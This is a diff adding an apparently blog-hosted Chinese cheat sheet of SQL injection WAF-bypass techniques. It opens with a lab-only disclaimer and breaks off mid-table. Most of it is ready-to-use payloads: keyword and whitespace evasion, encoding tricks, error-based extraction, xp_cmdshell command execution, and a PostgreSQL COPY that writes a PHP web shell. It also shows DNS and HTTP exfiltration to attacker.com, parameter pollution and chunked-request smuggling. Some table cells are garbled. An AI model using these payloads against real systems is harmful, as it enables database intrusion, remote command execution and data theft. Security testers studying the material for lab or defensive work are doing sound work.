@@ -1,0 +1,887 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入绕过思路 | trifbxy's Blog</title><meta name="author" content="trifbxy"><meta name="copyright" content="trifbxy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="免责声明：    本文所涉及的所有技术、代码、Payload 及工具，仅限于在本地搭建的合法靶场环境中进行学习和研究，严禁用于任何未经授权的真实系统。   文中演示的各类绕过技术，均在严格受控的本地测试环境中完成，旨在帮助读者理解漏洞原理与防御思路。   任何因读者违反上述规定而引发的法律问题及后果，均与本文作者无关。请遵守国家法律法规，维护网络安全。   本文旨在分享技术思路，鼓励读者通过合法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入绕过思路">
+<meta property="og:url" content="https://trifbxy.github.io/2026/04/01/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/index.html">
+<meta property="og:site_name" content="trifbxy&#39;s Blog">
+<meta property="og:description" content="免责声明：    本文所涉及的所有技术、代码、Payload 及工具，仅限于在本地搭建的合法靶场环境中进行学习和研究，严禁用于任何未经授权的真实系统。   文中演示的各类绕过技术，均在严格受控的本地测试环境中完成，旨在帮助读者理解漏洞原理与防御思路。   任何因读者违反上述规定而引发的法律问题及后果，均与本文作者无关。请遵守国家法律法规，维护网络安全。   本文旨在分享技术思路，鼓励读者通过合法">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/185476288?v=4&size=64">
+<meta property="article:published_time" content="2026-03-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-01T12:40:07.829Z">
+<meta property="article:author" content="trifbxy">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="WAF绕过">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://avatars.githubusercontent.com/u/185476288?v=4&size=64"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SQL注入绕过思路",
+  "url": "https://trifbxy.github.io/2026/04/01/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/",
+  "image": "https://avatars.githubusercontent.com/u/185476288?v=4&size=64",
+  "datePublished": "2026-03-31T16:00:00.000Z",
+  "dateModified": "2026-04-01T12:40:07.829Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "trifbxy",
+      "url": "https://trifbxy.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://trifbxy.github.io/2026/04/01/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL注入绕过思路',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">trifbxy's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">SQL注入绕过思路</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">SQL注入绕过思路</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-03-31T16:00:00.000Z" title="发表于 2026-04-01 00:00:00">2026-04-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-01T12:40:07.829Z" title="更新于 2026-04-01 20:40:07">2026-04-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
+<p><strong>免责声明：</strong>  </p>
+<ol>
+<li>本文所涉及的所有技术、代码、Payload 及工具，仅限于在本地搭建的合法靶场环境中进行学习和研究，严禁用于任何未经授权的真实系统。  </li>
+<li>文中演示的各类绕过技术，均在严格受控的本地测试环境中完成，旨在帮助读者理解漏洞原理与防御思路。  </li>
+<li>任何因读者违反上述规定而引发的法律问题及后果，均与本文作者无关。请遵守国家法律法规，维护网络安全。  </li>
+<li>本文旨在分享技术思路，鼓励读者通过合法途径提升自身安全技能，共同维护健康的网络环境。</li>
+</ol>
+</blockquote>
+<hr>
+<h2 id="一、基础关键字绕过"><a href="#一、基础关键字绕过" class="headerlink" title="一、基础关键字绕过"></a>一、基础关键字绕过</h2><table>
+<thead>
+<tr>
+<th>原关键字</th>
+<th>绕过方式</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>and</code></td>
+<td><code>&amp;&amp;</code>、<code>anandd</code>、<code>/*!and*/</code>、<code>aNd</code></td>
+<td><code>1 &amp;&amp; 1=1</code>、<code>1 anandd 1=1</code></td>
+</tr>
+<tr>
+<td><code>or</code></td>
+<td>&#96;</td>
+<td></td>
+</tr>
+<tr>
+<td><code>xor</code></td>
+<td><code>^</code></td>
+<td><code>1 ^ 0</code></td>
+</tr>
+<tr>
+<td><code>not</code></td>
+<td><code>!</code></td>
+<td><code>!1</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="二、特殊字符绕过"><a href="#二、特殊字符绕过" class="headerlink" title="二、特殊字符绕过"></a>二、特殊字符绕过</h2><h3 id="1-空格绕过"><a href="#1-空格绕过" class="headerlink" title="1. 空格绕过"></a>1. 空格绕过</h3><table>
+<thead>
+<tr>
+<th>替代方式</th>
+<th>说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>%09</code>、<code>%0a</code>、<code>%0b</code>、<code>%0c</code>、<code>%0d</code></td>
+<td>各类空白符</td>
+<td><code>?id=1%0aunion%0aselect%0a1,2,3</code></td>
+</tr>
+<tr>
+<td><code>/**/</code></td>
+<td>多行注释</td>
+<td><code>?id=1/**/union/**/select/**/1,2,3</code></td>
+</tr>
+<tr>
+<td><code>()</code></td>
+<td>括号</td>
+<td><code>?id=1(union)select(1,2,3)</code></td>
+</tr>
+<tr>
+<td><code>%a0</code></td>
+<td>不间断空格（MySQL）</td>
+<td><code>?id=1%a0union%a0select%a01,2,3</code></td>
+</tr>
+<tr>
+<td><code>\N</code></td>
+<td>MySQL 空值</td>
+<td><code>?id=\Nunion select 1,2,3</code></td>
+</tr>
+</tbody></table>
+<p><strong>各数据库空白符范围</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>空白符</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MySQL</td>
+<td>09,0A,0B,0C,0D,A0,20</td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td>01-20 范围内除 0D,0A 外多数</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>00,0A,0D,0C,09,20</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>0A,0D,0C,09,20</td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td>09,0A,0D,0C,20</td>
+</tr>
+</tbody></table>
+<h3 id="2-等号（-）绕过"><a href="#2-等号（-）绕过" class="headerlink" title="2. 等号（=）绕过"></a>2. 等号（<code>=</code>）绕过</h3><table>
+<thead>
+<tr>
+<th>替代方式</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>like</code></td>
+<td><code>id like 1</code></td>
+</tr>
+<tr>
+<td><code>in</code></td>
+<td><code>id in (1)</code></td>
+</tr>
+<tr>
+<td><code>regexp</code></td>
+<td><code>id regexp 1</code></td>
+</tr>
+<tr>
+<td><code>between</code></td>
+<td><code>id between 1 and 1</code></td>
+</tr>
+<tr>
+<td><code>&lt;&gt;</code></td>
+<td><code>1&lt;&gt;2</code></td>
+</tr>
+</tbody></table>
+<h3 id="3-引号绕过"><a href="#3-引号绕过" class="headerlink" title="3. 引号绕过"></a>3. 引号绕过</h3><table>
+<thead>
+<tr>
+<th>方式</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>十六进制</td>
+<td><code>0x61646D696E</code></td>
+</tr>
+<tr>
+<td>宽字节（GBK）</td>
+<td><code>%df%27</code>、<code>%aa%27</code></td>
+</tr>
+<tr>
+<td>Unicode</td>
+<td><code>%u0027</code>、<code>%uff07</code>、<code>%e0%80%a7</code></td>
+</tr>
+<tr>
+<td>无引号</td>
+<td>直接使用数字或函数返回值</td>
+</tr>
+</tbody></table>
+<h3 id="4-括号绕过"><a href="#4-括号绕过" class="headerlink" title="4. 括号绕过"></a>4. 括号绕过</h3><table>
+<thead>
+<tr>
+<th>字符</th>
+<th>Unicode 示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>左括号 <code>(</code></td>
+<td><code>%u0028</code>、<code>%uff08</code>、<code>%c0%28</code>、<code>%e0%80%a8</code></td>
+</tr>
+<tr>
+<td>右括号 <code>)</code></td>
+<td><code>%u0029</code>、<code>%uff09</code>、<code>%c0%29</code>、<code>%e0%80%a9</code></td>
+</tr>
+</tbody></table>
+<h3 id="5-逗号绕过"><a href="#5-逗号绕过" class="headerlink" title="5. 逗号绕过"></a>5. 逗号绕过</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>绕过方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>substr()</code></td>
+<td><code>substr(database() from 1 for 1)</code></td>
+</tr>
+<tr>
+<td><code>mid()</code></td>
+<td><code>mid(database() from 1 for 1)</code></td>
+</tr>
+<tr>
+<td><code>limit</code></td>
+<td><code>limit 1 offset 0</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="三、联合查询与函数绕过"><a href="#三、联合查询与函数绕过" class="headerlink" title="三、联合查询与函数绕过"></a>三、联合查询与函数绕过</h2><h3 id="1-union-select-绕过"><a href="#1-union-select-绕过" class="headerlink" title="1. union select 绕过"></a>1. <code>union select</code> 绕过</h3><table>
+<thead>
+<tr>
+<th>方式</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>十六进制</td>
+<td><code>unio\x6e selec\x74</code></td>
+</tr>
+<tr>
+<td>内联注释</td>
+<td><code>/*!union*/ /*!select*/</code></td>
+</tr>
+<tr>
+<td>大小写</td>
+<td><code>UnIoN SeLeCt</code></td>
+</tr>
+<tr>
+<td>双写</td>
+<td><code>uniunionon selselectect</code></td>
+</tr>
+<tr>
+<td>科学计数法</td>
+<td><code>1e0union select</code></td>
+</tr>
+<tr>
+<td>逻辑绕过</td>
+<td><code>1 &amp;&amp; (select user from users limit 1)=&#39;admin&#39;</code></td>
+</tr>
+</tbody></table>
+<h3 id="2-函数等价替换"><a href="#2-函数等价替换" class="headerlink" title="2. 函数等价替换"></a>2. 函数等价替换</h3><table>
+<thead>
+<tr>
+<th>原函数</th>
+<th>等价函数&#x2F;变量</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ascii()</code></td>
+<td><code>hex()</code>、<code>bin()</code></td>
+</tr>
+<tr>
+<td><code>sleep()</code></td>
+<td><code>benchmark()</code>、笛卡尔积延时</td>
+</tr>
+<tr>
+<td><code>concat()</code></td>
+<td><code>concat_ws()</code>、<code>group_concat()</code></td>
+</tr>
+<tr>
+<td><code>substr()</code> &#x2F; <code>mid()</code></td>
+<td><code>substring()</code>、<code>left()</code>、<code>right()</code>、<code>lpad()</code></td>
+</tr>
+<tr>
+<td><code>user()</code></td>
+<td><code>@@user</code></td>
+</tr>
+<tr>
+<td><code>database()</code></td>
+<td><code>schema()</code></td>
+</tr>
+<tr>
+<td><code>version()</code></td>
+<td><code>@@version</code>（MSSQL）</td>
+</tr>
+</tbody></table>
+<h3 id="3-报错注入函数"><a href="#3-报错注入函数" class="headerlink" title="3. 报错注入函数"></a>3. 报错注入函数</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>extractvalue()</code></td>
+<td><code>extractvalue(1,concat(0x7e,database()))</code></td>
+</tr>
+<tr>
+<td><code>updatexml()</code></td>
+<td><code>updatexml(1,concat(0x7e,database()),1)</code></td>
+</tr>
+<tr>
+<td><code>floor()</code> 双查询</td>
+<td><code>select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x</code></td>
+</tr>
+<tr>
+<td><code>name_const()</code></td>
+<td><code>name_const((select user()),1)</code></td>
+</tr>
+</tbody></table>
+<h3 id="4-生僻函数"><a href="#4-生僻函数" class="headerlink" title="4. 生僻函数"></a>4. 生僻函数</h3><table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>函数</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MySQL</td>
+<td><code>updatexml</code></td>
+<td><code>updatexml(1,concat(0x3a,(select user())),1)</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>xmlelement</code></td>
+<td><code>SELECT xmlelement(name img,xmlattributes(1as src,&#39;a\l\x65rt(1)&#39;as \117n\x65rror));</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>query_to_xml</code></td>
+<td><code>SELECT query_to_xml(&#39;select user&#39;,true,true,&#39;&#39;)</code></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>DBMS_XMLGEN</code></td>
+<td><code>SELECT DBMS_XMLGEN.GETXML(&#39;select user from dual&#39;) FROM dual</code></td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td><code>STUFF</code></td>
+<td><code>SELECT STUFF(&#39;abc&#39;,1,1,&#39;d&#39;)</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="四、编码绕过"><a href="#四、编码绕过" class="headerlink" title="四、编码绕过"></a>四、编码绕过</h2><h3 id="1-URL-编码"><a href="#1-URL-编码" class="headerlink" title="1. URL 编码"></a>1. URL 编码</h3><table>
+<thead>
+<tr>
+<th>原字符</th>
+<th>URL编码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&#39;</code></td>
+<td><code>%27</code></td>
+</tr>
+<tr>
+<td><code>or</code></td>
+<td><code>%6f%72</code></td>
+</tr>
+<tr>
+<td><code>1=1</code></td>
+<td><code>%31%3d%31</code></td>
+</tr>
+<tr>
+<td>空格</td>
+<td><code>%20</code></td>
+</tr>
+</tbody></table>
+<h3 id="2-双重编码"><a href="#2-双重编码" class="headerlink" title="2. 双重编码"></a>2. 双重编码</h3><table>
+<thead>
+<tr>
+<th>原字符</th>
+<th>双重编码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&#39;</code></td>
+<td><code>%2527</code></td>
+</tr>
+<tr>
+<td><code>/</code></td>
+<td><code>%252f</code></td>
+</tr>
+<tr>
+<td><code>union</code></td>
+<td><code>%2575%256e%2569%256f%256e</code></td>
+</tr>
+</tbody></table>
+<h3 id="3-Unicode-编码"><a href="#3-Unicode-编码" class="headerlink" title="3. Unicode 编码"></a>3. Unicode 编码</h3><table>
+<thead>
+<tr>
+<th>字符</th>
+<th>Unicode 示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>单引号 <code>&#39;</code></td>
+<td><code>%u0027</code>、<code>%uff07</code>、<code>%e0%80%a7</code>、<code>%c0%27</code></td>
+</tr>
+<tr>
+<td>左括号 <code>(</code></td>
+<td><code>%u0028</code>、<code>%uff08</code>、<code>%e0%80%a8</code>、<code>%c0%28</code></td>
+</tr>
+<tr>
+<td>右括号 <code>)</code></td>
+<td><code>%u0029</code>、<code>%uff09</code>、<code>%e0%80%a9</code>、<code>%c0%29</code></td>
+</tr>
+<tr>
+<td>空格</td>
+<td><code>%u0020</code>、<code>%uff00</code>、<code>%c0%20</code>、<code>%e0%80%a0</code></td>
+</tr>
+</tbody></table>
+<h3 id="4-十六进制编码"><a href="#4-十六进制编码" class="headerlink" title="4. 十六进制编码"></a>4. 十六进制编码</h3><table>
+<thead>
+<tr>
+<th>示例</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>0x61646D696E</code></td>
+<td>表示字符串 <code>admin</code></td>
+</tr>
+<tr>
+<td><code>0x3C613E61646D696E3C2F613E</code></td>
+<td>表示 XML 标签 <code>&lt;a&gt;admin&lt;/a&gt;</code></td>
+</tr>
+</tbody></table>
+<h3 id="5-Base64-编码"><a href="#5-Base64-编码" class="headerlink" title="5. Base64 编码"></a>5. Base64 编码</h3><table>
+<thead>
+<tr>
+<th>示例</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>YWRtaW4=</code></td>
+<td><code>admin</code> 的 Base64 编码</td>
+</tr>
+<tr>
+<td><code>dW5pb24gc2VsZWN0</code></td>
+<td><code>union select</code> 的 Base64</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="五、数据库特性绕过"><a href="#五、数据库特性绕过" class="headerlink" title="五、数据库特性绕过"></a>五、数据库特性绕过</h2><h3 id="1-宽字节注入（GBK）"><a href="#1-宽字节注入（GBK）" class="headerlink" title="1. 宽字节注入（GBK）"></a>1. 宽字节注入（GBK）</h3><table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>%df%27</code></td>
+<td>反斜杠被 <code>%df</code> 吃掉，单引号逃逸</td>
+</tr>
+<tr>
+<td><code>%aa%27</code></td>
+<td>同上</td>
+</tr>
+<tr>
+<td><code>%e5%5c%27</code></td>
+<td>部分编码组合</td>
+</tr>
+</tbody></table>
+<h3 id="2-科学计数法与特殊数字表示"><a href="#2-科学计数法与特殊数字表示" class="headerlink" title="2. 科学计数法与特殊数字表示"></a>2. 科学计数法与特殊数字表示</h3><table>
+<thead>
+<tr>
+<th>示例</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>8E0union select</code></td>
+<td>8E0 被解析为数字 8</td>
+</tr>
+<tr>
+<td><code>8.0union select</code></td>
+<td>浮点数表示</td>
+</tr>
+<tr>
+<td><code>\Nunion select</code></td>
+<td>MySQL中 <code>\N</code> 代表 NULL</td>
+</tr>
+</tbody></table>
+<h3 id="3-内联注释"><a href="#3-内联注释" class="headerlink" title="3. 内联注释"></a>3. 内联注释</h3><table>
+<thead>
+<tr>
+<th>示例</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/*!50000union*/</code></td>
+<td>版本号大于等于 5.00.00 时执行</td>
+</tr>
+<tr>
+<td><code>/*!50000select*/</code></td>
+<td>同上</td>
+</tr>
+<tr>
+<td><code>/*!union*/ /*!select*/</code></td>
+<td>可任意组合</td>
+</tr>
+</tbody></table>
+<h3 id="4-不同数据库特有语法"><a href="#4-不同数据库特有语法" class="headerlink" title="4. 不同数据库特有语法"></a>4. 不同数据库特有语法</h3><table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>示例</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>MSSQL</strong></td>
+<td><code>WAITFOR DELAY &#39;0:0:5&#39;</code></td>
+<td>时间盲注</td>
+</tr>
+<tr>
+<td></td>
+<td><code>exec xp_cmdshell &#39;whoami&#39;</code></td>
+<td>执行系统命令</td>
+</tr>
+<tr>
+<td></td>
+<td><code>SELECT * FROM users WHERE id=1; EXEC master..xp_cmdshell &#39;dir&#39;</code></td>
+<td>堆叠查询</td>
+</tr>
+<tr>
+<td></td>
+<td><code>SELECT 1 WHERE 1=1; WAITFOR DELAY &#39;0:0:5&#39;</code></td>
+<td>堆叠+延时</td>
+</tr>
+<tr>
+<td><strong>Oracle</strong></td>
+<td><code>DBMS_PIPE.RECEIVE_MESSAGE(&#39;x&#39;,5)</code></td>
+<td>延时</td>
+</tr>
+<tr>
+<td></td>
+<td>&#96;UTL_HTTP.REQUEST(‘<a target="_blank" rel="noopener" href="http://attacker.com/">http://attacker.com/</a>‘</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td><code>DBMS_LOCK.SLEEP(5)</code></td>
+<td>延时（部分版本）</td>
+</tr>
+<tr>
+<td></td>
+<td><code>ctxsys.drithsx.sn(1,1)</code></td>
+<td>报错</td>
+</tr>
+<tr>
+<td><strong>PostgreSQL</strong></td>
+<td><code>pg_sleep(5)</code></td>
+<td>延时</td>
+</tr>
+<tr>
+<td></td>
+<td><code>COPY (SELECT &#39;&lt;?php system($_GET[cmd]);?&gt;&#39;) TO &#39;/var/www/shell.php&#39;</code></td>
+<td>文件写入</td>
+</tr>
+<tr>
+<td></td>
+<td><code>current_setting(&#39;block_size&#39;)::int</code></td>
+<td>报错</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="六、HTTP-协议层绕过"><a href="#六、HTTP-协议层绕过" class="headerlink" title="六、HTTP 协议层绕过"></a>六、HTTP 协议层绕过</h2><table>
+<thead>
+<tr>
+<th>技术</th>
+<th>示例</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>HTTP参数污染</strong></td>
+<td><code>?id=1&amp;id=union select</code></td>
+<td>WAF 检查第一个，后端取最后一个</td>
+</tr>
+<tr>
+<td><strong>分块传输编码</strong></td>
+<td>见下方</td>
+<td>拆分 Payload，WAF 未重组</td>
+</tr>
+<tr>
+<td><strong>HTTP方法变异</strong></td>
+<td><code>HEAD</code>、<code>PUT</code>、<code>OPTIONS</code></td>
+<td>绕过仅对 GET&#x2F;POST 的规则</td>
+</tr>
+<tr>
+<td><strong>Content-Type 欺骗</strong></td>
+<td><code>multipart/form-data</code> 伪装成 <code>x-www-form-urlencoded</code></td>
+<td>检测盲区</td>
+</tr>
+<tr>
+<td><strong>字符集欺骗</strong></td>
+<td><code>charset=ibm500</code></td>
+<td>解码不一致</td>
+</tr>
+<tr>
+<td><strong>畸形请求行</strong></td>
+<td><code>HTTP/0.9</code>、省略版本号</td>
+<td>解析差异</td>
+</tr>
+</tbody></table>
+<p><strong>分块传输示例</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sql.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-stata">7</span></span><br><span class="line"><span class="language-stata"><span class="keyword">Se</span> lect</span></span><br><span class="line"><span class="language-stata">5</span></span><br><span class="line"><span class="language-stata"><span class="comment">* fro</span></span></span><br><span class="line"><span class="language-stata">6</span></span><br><span class="line"><span class="language-stata"><span class="keyword">m</span> users</span></span><br><span class="line"><span class="language-stata">0</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="七、编程语言层绕过"><a href="#七、编程语言层绕过" class="headerlink" title="七、编程语言层绕过"></a>七、编程语言层绕过</h2><table>
+<thead>
+<tr>
+<th>技术</th>
+<th>示例</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>字符串处理</strong></td>
+<td><code>addslashes()</code> 不处理多字节</td>
+<td>配合宽字节注入</td>
+</tr>
+<tr>
+<td><strong>正则缺陷</strong></td>
+<td><code>1\nunion select</code></td>
+<td>换行绕过 <code>^</code> 和 <code>$</code> 边界</td>
+</tr>
+<tr>
+<td><strong>全局配置</strong></td>
+<td><code>magic_quotes_gpc</code> 开启</td>
+<td>基于未转义版本检测导致误判</td>
+</tr>
+<tr>
+<td><strong>API 误用</strong></td>
+<td><code>mysqli_query()</code> 而非 <code>prepare()</code></td>
+<td>即使 WAF 放行，仍存在注入</td>
+</tr>
+<tr>
+<td><strong>输入截断</strong></td>
+<td><code>%00</code> 空字节</td>
+<td>语言截断，数据库仅接收部分</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="八、高阶绕过技术"><a href="#八、高阶绕过技术" class="headerlink" title="八、高阶绕过技术"></a>八、高阶绕过技术</h2><table>
+<thead>
+<tr>
+<th>技术</th>
+<th>示例</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>DNSlog 外带</strong></td>
+<td><code>SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT database()),&#39;.attacker.com\\test&#39;))</code></td>
+<td>利用 DNS 解析外带数据</td>
+</tr>
+<tr>
+<td></td>
+<td><code>EXEC(&#39;master..xp_dirtree &quot;\\\\&#39;+@a+&#39;.attacker.com\\test&quot;&#39;)</code></td>
+<td>MSSQL 外带</td>
+</tr>
+<tr>
+<td><strong>JSON&#x2F;XML 注入</strong></td>
+<td><code>&#123;&quot;username&quot;:&quot;admin&#39; OR &#39;1&#39;=&#39;1&quot;&#125;</code></td>
+<td>WAF 未解析 JSON 内容</td>
+</tr>
+<tr>
+<td></td>
+<td><code>&lt;user&gt;&lt;name&gt;admin&#39; OR &#39;1&#39;=&#39;1&lt;/name&gt;&lt;/user&gt;</code></td>
+<td>XML 注入</td>
+</tr>
+<tr>
+<td><strong>WebSocket 绕过</strong></td>
